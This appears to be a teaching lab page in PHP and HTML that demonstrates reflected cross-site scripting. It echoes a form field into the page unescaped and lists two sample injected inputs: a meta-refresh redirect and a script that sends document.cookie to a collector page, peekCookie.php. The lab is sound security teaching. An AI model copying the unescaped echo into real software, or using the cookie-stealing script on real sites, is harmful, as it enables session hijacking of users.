<?php
$data = "";
if (isset ( $_POST ["btnWriteCookie"] )) {
	setcookie ( "cookieUser", "Derek Jeter" );
}

if (isset ( $_POST ["btnOK"] )) {
	$data = $_POST ["txtData"];
}

?>

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Lab</title>
<?php require("script_css.php")?>
</head>
<body>
	<div id="labPage" data-role="page" data-theme="d">
		<div data-role="header">
			<h3>Lab</h3>
		</div>

		<div data-role="content">
			<form method="post" action="index.php">
				Your name: <input type="text" name="txtData" value="" />
				<Label>Hello! <?php echo $data; ?></Label>
				<div class="ui-grid-a">
					<div class="ui-block-a">
						<input type="submit" name="btnOK" value="OK" />
					</div>
				<div class="ui-block-b">
						<input type="submit" name="btnWriteCookie" value="Write Cookie" />
					</div>
				</div>
				<div>
					<ul data-role="listview" data-inset="true">
						<li data-role="list-divider">如果使用者這樣子輸入資料呢?</li>
						<li>&lt;meta http-equiv="refresh" content="1;URL=page2.php"&gt;</li>
						<li>&lt;script&gt;location.href = "peekCookie.php?CookieData=" + escape(document.cookie)&lt;/script&gt;</li>
					</ul>
				</div>
			</form>
		</div>

	</div>
	<!-- page -->

	<script>
		
	</script>
</body>
</html>
